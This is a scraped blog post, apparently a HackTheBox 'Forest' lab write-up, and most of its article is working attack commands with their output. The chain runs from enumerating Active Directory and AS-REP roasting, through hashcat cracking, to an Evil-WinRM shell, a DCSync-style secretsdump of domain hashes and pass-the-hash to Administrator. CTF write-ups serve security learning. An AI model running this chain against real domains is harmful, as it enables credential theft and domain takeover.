aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami htb\\administrator C:\\users\\administrator\\desktop&gt;type root.txt [f*******************************] If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","dateModified":"2020-04-19T22:09:00+05:30","datePublished":"2020-04-19T22:09:00+05:30","headline":"HackTheBox Forest","mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//hackthebox/retired/2020/04/19/Forest.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"https://jeevanachandra.github.io//hackthebox/retired/2020/04/19/Forest.html","image":"https://jeevanachandra.github.io//assets/img/sample/forest.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Forest</h1>
+  <h3 class="post-subtitle"></h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2020-04-19T22:09:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Apr 19, 2020
+    </time>
+    
+    <img src="/assets/img/sample/forest.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 6 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#windows">#windows</a><a class="post-tag" href="/tags.html#activedirectory">#activedirectory</a><a class="post-tag" href="/tags.html#impacket">#impacket</a><a class="post-tag" href="/tags.html#evilwinrm">#evilwinrm</a><a class="post-tag" href="/tags.html#bloodhound">#bloodhound</a><a class="post-tag" href="/tags.html#rpcclient">#rpcclient</a>
+</div></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.161
+Host is up (0.031s latency).
+Not shown: 64742 closed ports, 769 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49678/tcp open  unknown
+49697/tcp open  unknown
+49898/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
+
+root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.030s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|\_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18\:32\:33Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|\_http-server-header: Microsoft-HTTPAPI/2.0
+|\_http-title: Not Found
+9389/tcp open  mc-nmf       .NET Message Framing
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o\:microsoft\:windows
+
+Host script results:
+|\_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 \(Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|\_  System time: 2019-10-14T11\:34\:51-07:00
+| smb-security-mode: 
+|   account\_used: &lt;blank&gt;
+|   authentication\_level: user
+|   challenge\_response: supported
+|\_  message\_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|\_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-10-14T18\:34\:52
+|\_  start\_date: 2019-10-14T09\:52\:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds
+
+root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.161
+Host is up (0.091s latency).
+Not shown: 65457 open|filtered ports, 74 closed ports
+PORT      STATE SERVICE
+123/udp   open  ntp
+389/udp   open  ldap
+58399/udp open  unknown
+58507/udp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
+</code></pre></div></div>
+
+<h2 id="finding-users-in-the-domain">Finding Users in the domain</h2>
+
+<p>I used <code>RPCCLIENT</code> to find the users in the domain</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#rpcclient 10.10.10.161 -U%
+rpcclient $&gt; enumdom
+enumdomains    enumdomgroups  enumdomusers   
+rpcclient $&gt; enumdomusers 
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre></div></div>
+
+<h2 id="getting-tgt">Getting TGT</h2>
+<p>Getting the <code>TGT</code> from the list of users found from <code>RPCCLIENT</code> using <code>IMPACKET SCRIPTS</code>.</p>
+
+<blockquote>
+  <p>python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco</p>
+</blockquote>
+
+<p>There are a bunch of ways to use <code>impacket-scripts</code>, so we can use the below options as well.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
+
+htb.local - is the domain name we extracted from the nmap output
+-usersfile - the list of users we want to test aginst // we extracted from enum4linux output
+-format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt
+-outputfile - the place to put the output in
+-dc-ip - the domain controller IP address
+</code></pre></div></div>
+
+<p>we get the hash of the user <code>SVC-alfresco</code></p>
+
+<blockquote>
+  <p>$krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb</p>
+</blockquote>
+
+<h2 id="cracking-the-hash">Cracking the hash</h2>
+
+<p>Now it’s time to crack the hash of the user SVC-alfresco</p>
+
+<blockquote>
+  <p>hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt</p>
+</blockquote>
+
+<blockquote>
+  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code>s3rvice</code></p>
+</blockquote>
+
+<p>As the password is found, I proceed with using <code>Evil-Winrm</code> to gain the foothold of the machine</p>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
+Info: Starting Evil-WinRM shell v1.7
+Info: Establishing connection to remote endpoint                                                         
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt;
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; type user.txt
+[e*******************************]
+</code></pre></div></div>
+
+<h2 id="privileges-escalation">privileges Escalation</h2>
+
+<h3 id="from-svc-alfresco-to-administrator">From svc-alfresco to Administrator</h3>
+
+<p>Using <code>bloodhound</code> to find some intresting stuff</p>
+
+<p><img src="/assets/img/sample/forest1.png" alt=""></p>
+
+<p>BloodHound Result Shows Svc-Alfresco can <code>WriteDacl</code> to HTB.local that Contains <code>administrator@htb.local.</code></p>
+
+<h3 id="useful-link-for-priv-esc">Useful link for priv esc</h3>
+
+<blockquote>
+  <p>https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</p>
+</blockquote>
+
+<p>No it’s time to abuse the AD…</p>
+
+<blockquote>
+  <p>net group “Exchange Windows Permissions” svc-alfresco /add /domain</p>
+</blockquote>
+
+<blockquote>
+  <p>python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid\:rid\:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator\:500\:aad3b435b51404eeaad3b435b51404ee\:32693b11e6aa90eb43d32c72a07ceea6\:::
+Guest\:501\:aad3b435b51404eeaad3b435b51404ee\:31d6cfe0d16ae931b73c59d7e0c089c0\:::
+krbtgt\:502\:aad3b435b51404eeaad3b435b51404ee\:819af826bb148e603acb0f33d17632f8\:::
+DefaultAccount\:503\:aad3b435b51404eeaad3b435b51404ee\:31d6cfe0d16ae931b73c59d7e0c089c0\:::
+htb.local\$331000-VK4ADACQNUCA\:1123\:aad3b435b51404eeaad3b435b51404ee\:31d6cfe0d16ae931b73c59d7e0c089c0\:::
+</code></pre></div></div>
+
+<p>So as we found the hash of the Administrator of the domain, we can now use <code>Pass the hash</code> to gain the Shell of Administrator.</p>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i forest.htb -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+Info: Starting Evil-WinRM shell v1.7
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+htb\administrator
+C:\users\administrator\desktop&gt;type root.txt
+[f*******************************]
+</code></pre></div></div>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br>
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/otherposts/2020/04/15/Kali-Linux-Tools.html" title="Kali-Linux-Tools">Kali-Linux-Tools</a><a class="next" href="/hackthebox/retired/2020/05/31/Resolute.html" title="HackTheBox Resolute">HackTheBox Resolute</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/retired/2020/03/11/Devel.html" title="HackTheBox Resolute">HackTheBox Devel</a></li>
+<li><a class="post-link" href="/hackthebox/2020/07/11/Blackfield.html" title="HackTheBox Resolute">Hackthebox Blackfiled</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/06/19/Sauna.html" title="HackTheBox Resolute">HackTheBox Sauna</a></li>
+<li><a class="post-link" href="/tryhackme/2020/07/08/Haskhell.html" title="HackTheBox Resolute">Tryhackme Haskhell</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
